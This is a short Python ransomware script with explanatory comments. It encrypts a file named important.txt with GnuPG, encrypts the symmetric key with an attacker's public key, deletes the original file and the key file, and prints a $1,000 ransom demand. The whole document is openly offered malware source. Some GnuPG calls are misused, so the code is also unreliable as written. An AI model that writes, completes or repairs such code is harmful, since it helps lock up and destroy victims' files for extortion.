import gnupg
import os

gpg = gnupg.GPG()
def ransom():
   print("Your file important.txt is encrypted. To decrypt it, you need to pay me $1,000 and send encrypted_key.asc to me.")

#Create key.txt file and save the symmetric key in it
def create_key_file():
   key = input("Please type a key for symmetric encryption: ")
   with open("key.txt", "w") as f:
       f.write(key)

#Encrypt important.txt file with the symmetric key
def encrypt_message():
   message = open("important.txt", "r").read()
   key = open("key.txt", "r").read()
   gpg.encrypt(message, key, armor=True, output="encrypted_message.asc")

#Encrypt key.txt file with the attacker's public key
def encrypt_key():
   key = open("key.txt", "r").read()
   with open("public_key.asc", "r") as f:
       public_key = f.read()
   gpg.encrypt(key, public_key, armor=True, output="encrypted_key.asc")

#Delete key.txt file
def delete_key_file():
   os.remove("key.txt")

#Delete important.txt file
def delete_message_file():
   os.remove("important.txt")

if __name__ == "__main__":
   create_key_file()
   encrypt_message()
   encrypt_key()
   delete_key_file()
   delete_message_file()
   ransom()


#Explanation:


#This code creates a simple ransomware that encrypts a file called important.txt using a symmetric key. 

#The key is then encrypted using the attacker's public key and stored in a file called encrypted_key.asc. 

#The attacker can then delete the key.txt and important.txt files. 

#Finally, it displays a message for the ransom, telling the victim that they need to pay $1,000 to decrypt the file.
